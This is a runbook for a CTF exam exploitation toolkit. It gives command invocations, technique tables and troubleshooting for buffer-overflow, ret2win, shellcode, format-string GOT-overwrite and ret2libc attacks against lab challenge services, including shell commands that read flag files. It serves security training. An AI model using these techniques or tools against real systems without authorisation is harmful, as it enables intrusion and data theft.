# Exam Runbook — stdlib-only toolkit

No pwntools, no internet. Every tool prints its diagnosis and fails loudly. Start with section 0;
the decision tree is for doing a step by hand. **Scripts are allowed.**

## 00. On the exam machine, before anything else

```
bash smoke.sh            # 30 s: python version, objdump/readelf/strings, one solve per technique
python3 compat.py        # just the machine check, 1 s
```

If it says `objdump not found`: `sudo apt install binutils`. Without objdump the tools do
not crash, they just find nothing - and say so now (`NOT INSTALLED: objdump`) instead of
looking like a hard challenge.

## 0. Always start here

**Run every command in this file from inside `ctf/script/`.** (`ctf/scripts/`, with an s,
is an old copy: it has no `go.py` and no `fmtpwn.py`.)

```
cd bof-scripts
bash smoke.sh                                   # 30 s, once: is the toolkit alive on this machine?
python3 go.py                                   # then, per question: it asks you everything
```

`go.py` is the whole procedure. The rest of this file is for when it does not solve, or
when you want to do one step by hand:

```
python3 solve.py HOST PORT --binary ./chall         # triage only: what does it think this is? changes nothing
python3 solve.py HOST PORT --binary ./chall --run   # the same thing go.py runs
python3 elftool.py ./chall                          # arch, NX/PIE/canary, win symbol, offsets, gadgets, VERDICT
```

## The no-flags way: `go.py`

```
python3 go.py                                   # it asks you everything
python3 go.py HOST PORT ./chall paper.txt       # or give it what you have, any order
```

If the question paper (or a PDF, or the whiteboard) gives you something the service does
not print - a buffer size, an offset, an address, a code, a key, a sum, a username and
password - type it into a text file exactly as written, or paste it when `go.py` asks.
It prints `from your notes I read:` first. **Check that list.** If a line is wrong, fix
the notes and run again.

| the paper says | it becomes |
|---|---|
| "the buffer is 64 bytes" / `char buf[64]` | offsets to try: 68, 72, 76, ... |
| "offset is 76" / "72 bytes of padding" | that offset, used as given |
| "win() is at 0x401186" | the address to return to |
| "the access code is 0x1337c0de" / "key = 0x1000 + 0x337" | the guard value / `win()` argument (sums are worked out) |
| "username: bob, password: hunter2" | the login |

It also reads `#define KEY 0x1337`, `0b1010011`, `401186h`, `\xef\xbe\xad\xde`,
"sixty-four bytes", "64 characters", "72 A's" and `'A' * 76`. Type the paper's words as
they are; do not translate them for it.

`python3 notes.py paper.txt` shows what it would read, without connecting to anything.
The old flags (`--value`, `--addr`, `--offset`, `--win-arg`) still work if you prefer them.

**Format-string questions work the same way.** If the paper gives an address, type the
sentence: "The secret is stored at 0x0804c060" (it is read), "target is at 0x40406c and must
equal 0xDEADBEEF" (it is written), "puts GOT is at X, win() is at Y" (one is pointed at the
other). No binary needed.

## 1. Decision tree

| What you see | Challenge type | Command |
|---|---|---|
| Banner prints `win()` addr + offset | **ret2win (printed)** | `auto_pwn.py --host H --port P --goal ret2win --arch amd64 --offset N --addr 0xWIN` |
| Binary has a `win`/`flag`/`shell` symbol, non-PIE | **ret2win** | `auto_pwn.py --host H --port P --binary ./b --goal ret2win` (scans offset) |
| Source compares a buffer to a literal / an `access_code`/`int` guard | **variable / struct overwrite** | `auto_pwn.py --host H --port P --goal var --offset N --value 0xVALUE --send-mode line`  (or `--goal strcmp --expect "literal"`) |
| `printf(user_input)` — `%x` echoes stack | **format string, ANY kind** | `fmtpwn.py H P --binary ./b` — tries every taught shape, 32- and 64-bit. See section 1c |
| ...and you want one specific thing | **format-string read / write** | `fmtpwn.py H P --goal dump` · `--goal read --addr 0xA` · `--goal write --addr 0xA --value 0xV` |
| Source says `if (auth)` / `if (x == 1)` / compares a `char` | **variable overwrite, small guard** | `auto_pwn.py --host H --port P --binary ./b --goal var` (offset+value read from the frame; `--dry-run` shows the plan) |
| `win()` calls `system("/bin/sh")` | **ret2win into a shell** | same ret2win command — it now types `cat flag*` for you (`--shell-cmd '...'` to change it) |
| Banner prints a stack address (`buffer at 0xff...`), exec stack | **ret2shellcode, lab layout** | `ret2shell.py --binary ./b --host H --port P` (address taken from the banner; `--after` if the buffer is tiny) |
| Exec stack (`-z execstack`) + `jmp esp` gadget, no win | **ret2shellcode** | `ret2shell.py --binary ./b --host H --port P` |
| Exec stack, buffer address printed, no `jmp esp` | **ret2shellcode (classic)** | `ret2shell.py --host H --port P --offset N --arch i386 --buf-regex 'buffer: (0x[0-9a-f]+)'` |
| NX on, no win symbol, `puts` in PLT | **ret2libc** (not taught; fallback) | hand-built; see `exploit_echo32.py` (leak→system / GOT-overwrite) |

## 1c. Format strings: `fmtpwn.py`

One command; it works out the argument slot, the word size and how many bytes fit:

```
python3 fmtpwn.py H P --binary ./b          # everything, cheapest first
python3 fmtpwn.py H P                       # no binary: stack + %s + leak-and-answer
python3 fmtpwn.py H P --binary ./b --pre 2  # bug is behind menu option 2
python3 fmtpwn.py H P --binary ./b -v       # show every payload and reply
```

| the challenge | goal it runs | what you would do by hand |
|---|---|---|
| flag bytes on the stack (5004 Echo Chamber) | `stack` | `%1$p.%2$p...`, decode little-endian |
| a POINTER to the flag on the stack (lab Attack 1) | `strings` | `%N$s` for each slot that holds a pointer |
| flag in a global, nothing points to it | `globals` | `%K$s` + the address AFTER the format |
| `if (target == 0x64)` / `if (target)` on a global | `guard` | `%100c%K$hn` + address after the format |
| `win()` + writable GOT | `got` | `%hn` pieces over the GOT slot of the next call |
| `printf(name)` then an overflow, canary and/or PIE | `leakbof` | leak the canary / a return address, then ret2win |
| `printf(name)` then "guess the number / password" | `echo` | leak it, type it back in the same connection |
| `printf(input)` in a loop, no `win()` (lab's last exercise) | `gotsys` | `%s` on a GOT slot -> libc base -> `%hn` system over `printf@GOT` -> `cat flag*` |

`--goal dump` prints the stack words with their ASCII, which is the fastest way to SEE a
flag, a password or a canary yourself. `--goal read` / `--goal write` are the manual
primitives when you already know the address.

If `gotsys` says **"no GOT entry gave a page-aligned libc base"**: the server's libc is not
your VM's. If the challenge ships a `libc.so.6`, add `--libc ./libc.so.6`.

If it says **"echoes %1$p back literally"**: that input is not a format string — the bug is
behind another prompt (`--pre LINE`, once per input before it) or it is not this bug class.

If it says **"our own input is not visible in printf's arguments"**: the buffer is a global
or on the heap. Reads of the stack still work; a write needs an address that is already on
the stack, which is a by-hand job (`--goal dump`, find a slot holding the address, `%N$n`).

Why the addresses go at the END of the payload (unlike the lab): a 64-bit address contains
NUL bytes and printf stops parsing at the first one, and anything in front of the first
`%n` is already counted. `bof.md` "Round 3" has the worked reasoning.

## 1d. When it fails: read the block marked READ THIS FIRST

`solve.py` ends a failed run with what the attempts DID establish. Example, no files given:

```
[!] DIAGNOSIS: the overflow REACHES a variable - the service printed back the value just sent
[!]     python3 auto_pwn.py --host H --port P --goal var --value 0xVALUE
```

That means: it is a variable overwrite, your input reaches the guard, and only the value
is unknown. Find it in the source (`if (x == 0x....)`) or with
`strings ./chall` / `python3 elftool.py ./chall`, then run the printed command. No offset
is needed - the value is repeated across the whole input.

## 1e. The exam host is slower than your VM

Tested through a proxy adding 150 ms each way (the practice host was ~230 ms round trip):
every clone still solves, typically in 10-20 s instead of 3-8 s. If the real host is
slower still, or busy:

| symptom | do |
|---|---|
| a tool says "out of time" / "budget used up" | `solve.py ... --run --timeout 600 --per-candidate 120` |
| `fmtpwn.py` alone runs out | `fmtpwn.py H P --binary ./b --budget 150` |
| replies look cut off | `auto_pwn.py ... --timeout 8 --idle 1.0` |

Do not panic-rerun: a second identical run takes just as long. Raise the budget once.

## 1f. "the target runs a DIFFERENT libc"

ret2libc and GOT -> system need `system()`'s position inside the SERVER's libc. If the
challenge ships a `libc.so.6`, pass it: `--libc ./libc.so.6` (both `ret2libc.py` and
`fmtpwn.py`). If it ships none, the server probably runs the lab VM's libc: run the tool
from that VM. The message tells you the three hex digits the server's `puts` ends in -
they identify the libc and are what you would search a libc database for, were one
allowed.

## 2. BEFORE trusting local addresses on a remote service — the Echo32 lesson
If you downloaded the binary, the deployed one may be a **different build** (addresses shifted).
```
python3 verify.py --binary ./b --host H --port P        # ~10s for 3 probes; needs puts in PLT
```
Each probe line ends with `[N.Ns, dumped]` — "dumped" means the leak hit a NUL early and was
re-read in chained pieces (normal; costs ~4-6s per probe).

| verify says | do |
|---|---|
| `remote binary == local binary` | use local addresses directly |
| `uniform exploit-shift -0xNN … [best match in K/3 probes]` | add `--shift=-0xNN` to `ret2shell.py` / `elftool.py` (note the `=`: argparse reads a bare `-0x..` as a flag). Trust it when K≥2. |
| K is 1/3, or `[?] inconsistent`, or `no consistent shift` | **do not trust it — fall back below** |
| `no puts in the PLT` / `dump failed` | verify cannot help; fall back below |

**Fallback when verify is inconclusive** (the exploit itself is the oracle — it is cheap to try):
```
python3 ret2shell.py --binary ./b --host H --port P                 # shift 0 first
python3 ret2shell.py --binary ./b --host H --port P --shift=-0x10   # then the usual suspects:
#   -0x10, -0x20, +0x10, +0x20  — small multiples of 16 (function alignment)
python3 verify.py --binary ./b --host H --port P --read 0xADDR      # eyeball one function's bytes
```
A build shift moves whole functions by a multiple of 16, so a handful of tries covers it.
`ret2shell` prints `shell confirmed` / `NOT confirmed` — stop at the first confirmed one.

- PLT/GOT are usually **not** shifted (different section) — confirm with `verify.py --read ADDR`.

## 3. Edge cases baked in
- **Flag format**: detector accepts `SIT{...}`, any `WORD{...}`, `flag is X`, or a bare 16–64 hex token,
  and auto-decodes little-endian hex leaks. Override anytime with `--flag-regex '...'`.
- **Offset is toolchain-specific** (e.g. 32 vs 44 under gcc-15 `-m32`): all tools **scan** a range;
  `elftool` ranks candidates (stdin `gets/read` first; a `win()` flag-file `fgets` is demoted).
- **Shellcode must set every register**: the built-in execve shellcode sets ebx/ecx/**edx** (and
  rdi/rsi/rdx). The classic 23-byte one leaves edx dirty and dies on some servers.
- **Send mode**: `--send-mode line` appends `\n` (for `gets`/`fgets`); `raw` sends exact bytes (for `read`).

## 4. The four sample challenges (verified solves)
```
5001 Rookie Access : auto_pwn.py --host H --port 5001 --goal var --offset 32 --value 0x1337c0de --send-mode line
5002 Stack Lab     : auto_pwn.py --host H --port 5002 --goal ret2win --arch amd64 --offset 40 --addr 0x401186
5004 Echo Chamber  : auto_pwn.py --host H --port 5004 --mode fmt --goal fmt-leak
5003 Echo32        : verify.py --binary ./echo32 --host H --port 5003   (finds shift -0x10)
                     ret2shell.py --binary ./echo32 --host H --port 5003 --shift=-0x10
```

## 5. If a tool stalls
- `--dry-run` prints the exact payload bytes so you can hand-edit.
- `--verbose` shows the raw service responses.
- Re-check: right `--arch`? right `--send-mode`? remote build shifted (run `verify.py`)? NX on (then not shellcode)?
```

## If it does not work: the flags that unblock things

Everything below is verified working. Reach for these only when the one-command form
has already failed.

| situation | flag | tool |
|---|---|---|
| ran out of time, target is slow | `--timeout 400` | any |
| one shape needs longer than its slice | `--per-candidate 120` | `solve.py` |
| want to see exactly what was sent | `--transcript` (default on) | `solve.py` |
| flag is not `SIT{...}`/`FLAG{...}` | `--flag-regex 'myctf\{[^}]*\}'` | `solve.py` |
| challenge shipped a `libc.so.6` | `--libc ./libc.so.6` | `ret2libc.py` |
| choose what runs in the shell | `--cmd 'cat /home/*/flag*'` | `ret2libc.py`, `ret2shell.py`, `fmtpwn.py` |
| ...after a ret2win / var overwrite | `--shell-cmd 'cat /home/*/flag*'` | `auto_pwn.py` |
| format string needs more stack than 64 words | `--slots 150` | `fmtpwn.py` |
| format-string run cut short by time | `--budget 120` | `fmtpwn.py` |
| see the var-overwrite plan without sending | `--goal var --dry-run` | `auto_pwn.py` |
| target reads again before checking | `--post ''` (default) or `--post 'cmd'` | `fmtwrite.py` |
| only the guard must change, buffer tiny | `--value any` | `fmtwrite.py` |
| address has `0x0a` in its upper half | `--half low` | `fmtwrite.py` |
| sink truncates on bytes you must send | `--badchars '\x00\x0a'` (auto-derived too) | `auto_pwn.py` |
| offset search starts too low | `--offset-start 200` | `auto_pwn.py` |
| PIE partial overwrite needs more rolls | `--partial-tries 256` | `auto_pwn.py` |
| menu must be walked by hand | `--talk 'Choice:=2' --talk '=PAYLOAD'` | `auto_pwn.py` |
| build shift, non-`puts` leak function | `--leak-func printf` | `verify.py` |

Two reminders that cost real time in this session:

- **The input function decides which bytes you can send.** `scanf("%s")` stops at ANY
  whitespace (`09 0a 0b 0c 0d 20`), `gets`/`fgets` only at `0a`, `strcpy` at `00`. The
  tools derive this from the binary now and say so; if a payload is skipped, the output
  names the byte and the address rather than just failing.
- **`scanf` needs a terminator.** Sending a raw payload with no newline makes it block
  forever. Line mode is the default for a reason.

## What it now handles without being told

These all work from the one command (`solve.py HOST PORT --binary ./chall --run`). Listed
so you know they exist, not because you need to type anything.

| the service does this | what happens |
|---|---|
| asks `what is 37 + 58 ?` with fresh numbers | reads it, computes, answers; pauses first in case "too fast" is rejected |
| asks you to echo a random token | sends the token back verbatim |
| asks `how many bytes will you send?` | answers a plausible size and carries on |
| wants a username/password | tries credentials found in `.rodata`; only used once the live service ACCEPTS them |
| reads a safe line first, overflows on the SECOND read | sends one harmless line, notices the new prompt, aims there |
| shows a numbered menu | walks every option with the best technique |
| rejects the letter `A` | notices the rejection and switches the padding byte |
| upper-cases your input | picks an address whose bytes survive, or says which byte will not |
| uses `scanf("%s")` | sends a terminator, and avoids every whitespace byte in the payload |
| needs shellcode under `scanf` | uses a 27-byte `execve` with no whitespace byte, since the usual one carries `0x0b` |
| uses `read()` with no newline | sends raw bytes instead |
| dies 3 seconds after connect | offset comes from the binary, not a slow sweep |
| changes its greeting every connection | nothing keys off exact banner text |
| has two win-like symbols, one a decoy | tries every win-like symbol |
| hides the guard behind `mov`+`cmp` (64-bit) | reads the constant from the win body, not just `cmp` operands |
| needs `win(a, b)` or `win(a, b, c)` | chains `pop rdi`/`pop rsi`/`pop rdx` with constants read from the binary |
| needs `win(char *key)` | passes the `.rodata` address of the compared literal |
| `win()` opens a shell instead of printing the flag | types `cat flag* flags/* /home/*/flag*` and reads the answer; lists EVERY flag-shaped string if there are several |
| guard is `if (auth)`, `== 1`, a `char`, or two fields | reads offset, width and value off the stack frame and sets them all in one payload |
| a neighbouring buffer is `strcmp`'d or passed to `system()` | fills up to it and writes the literal / a command |
| the overflow is a `strcpy` in another function | the guard is read from the frame of the copy |
| prints the buffer's address, executable stack, no `jmp esp` | NOP sled + shellcode in the buffer (or after the return address if it is too small) |
| format string, 64-bit, or nothing printed for you | `fmtpwn.py` runs first: section 1c |
| format string first, overflow or a question second | leaks the canary / PIE base / secret through the first and uses it in the second |
| guard value or `win(key)` changes every connection and is printed | reads the number from THAT connection's banner and uses it; reconnects if it contains a newline |
| arithmetic / token gate in front of a format-string bug | answers it before probing and before every payload |
| NO FILES given, service prints a stack address, executable stack | `ret2shell.py --spray`: return address repeated, sled after - no offset, word size from the pointer |
| NO FILES given, guard is `if (auth)` / `need 1` / an announced code | sprays the value over the whole input - no offset needed (3s) |
| login (credentials in the binary) in front of a format-string bug | logs in, probes again behind the login, runs the engine down the same path |
| `win(a, b)` with one constant and one announced value | builds the chain with both, tries both orders |
| "Set target to 48213 to pass" before a format string | writes the number announced on that connection |
| prints the flag as hex, reversed, base64 or rot13 | decodes it and says which ("the service printed it reversed") |
| format string in a loop, no `win()`, nothing printed (lab's last exercise) | leaks libc from the GOT, overwrites `printf@GOT` with `system`, sends the command |

### Flags you might still reach for

| situation | flag |
|---|---|
| the padding byte itself is refused | `--filler B` (or `--filler '\x90'`) |
| a gate needs a longer human-ish pause | `--gate-delay 0.5` |
| you have your own shellcode | `--shellcode-file sc.bin` |
| the jmp/buffer address comes from the banner | `--buf-regex 'buffer at (0x[0-9a-f]+)'` |
| the service wants exact bytes, no newline | `--send-mode raw` / `--no-newline` |
| a canary address appears in the banner | `--canary-regex` |
| scan deeper for the offset | `--offset-end 1024` |
| see everything that was tried | `--verbose`, plus `--log file` |

### Writing your own quick test against a clone

```bash
cd script
source testbed/launch.sh
read -r PID PORT <<< "$(tb_launch combo64)"      # free port, correct launch mode
python3 solve.py 127.0.0.1 "$PORT" --binary testbed/combo64 --run
tb_stop "$PID"                                    # by PID; never pkill -f
```

`tb_launch` exists because `canaryfork32` runs its own listener while the other clones need
`testbed/server.py` in front, and because `pkill -f <name>` also matches the script calling
it. Both mistakes produce failures that look like the exploit is broken.

## Practising unaided (the part the toolkit cannot do for you)

The tools are verified. What is not verified is you driving them under time pressure, and
that is the only gap no amount of testing here closes. `drill.sh` puts you in the exam's
position - a host, a port, and a binary, with no idea which shape it is:

```bash
bash drill.sh            # one random challenge
bash drill.sh 3          # three in a row
bash drill.sh 1 hard     # only the awkward ones: gates, menus, logins, rate limits
```

It prints the port, waits, and reveals which clone it was (plus that clone's own notes)
when you press Enter. 80 clones are in the pool, including every round-3 shape.

What to practise, in order:

1. `bash smoke.sh` first, every time. 30s. If your tools are broken you want to know
   before you spend ten minutes on a payload.
2. `python3 solve.py HOST PORT --binary ./chall` - read the triage. It names the shape and
   the evidence.
3. Add `--run`. If it refuses, read WHY: the output names what is known and what is
   missing, and the matching row in this file is the next step.
4. If it says a technique "cannot finish here", believe the arithmetic and move on. A
   brute on a rate-limited service really does cost 21 minutes.

Anything that takes you over ~5 minutes is worth re-reading here afterwards.
